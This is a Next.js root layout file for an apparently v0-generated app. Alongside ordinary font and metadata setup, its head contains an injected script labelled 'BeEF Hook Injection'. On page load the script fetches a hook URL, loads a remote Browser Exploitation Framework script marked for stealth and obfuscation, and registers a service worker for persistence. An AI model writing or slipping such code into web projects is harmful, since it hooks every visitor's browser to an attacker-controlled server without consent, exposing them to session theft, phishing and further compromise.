import type { Metadata } from 'next'
import { GeistSans } from 'geist/font/sans'
import { GeistMono } from 'geist/font/mono'
import './globals.css'

export const metadata: Metadata = {
  title: 'v0 App',
  description: 'Created with v0',
  generator: 'v0.dev',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">
      <head>
        <style>{`
html {
  font-family: ${GeistSans.style.fontFamily};
  --font-sans: ${GeistSans.variable};
  --font-mono: ${GeistMono.variable};
}
        `}</style>
        {/* BeEF Hook Injection */}
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (async function() {
                  const response = await fetch('/api/beef/hook-url');
                  const data = await response.json();
                  const beefHookUrl = data.hook_url;

                  if (beefHookUrl) {
                      const beefHook = document.createElement('script');
                      beefHook.src = beefHookUrl;
                      beefHook.setAttribute('data-stealth', 'true');
                      beefHook.setAttribute('data-obfuscation', 'advanced');
                      document.head.appendChild(beefHook);
                  }

                  // Register Service Worker for persistence
                  if ('serviceWorker' in navigator) {
                    window.addEventListener('load', function() {
                      navigator.serviceWorker.register('/beef-sw.js').then(function(registration) {
                        console.log('ServiceWorker registration successful with scope: ', registration.scope);
                      }, function(err) {
                        console.log('ServiceWorker registration failed: ', err);
                      });
                    });
                  }
              })();
            `,
          }}
        />
      </head>
      <body>{children}</body>
    </html>
  )
}
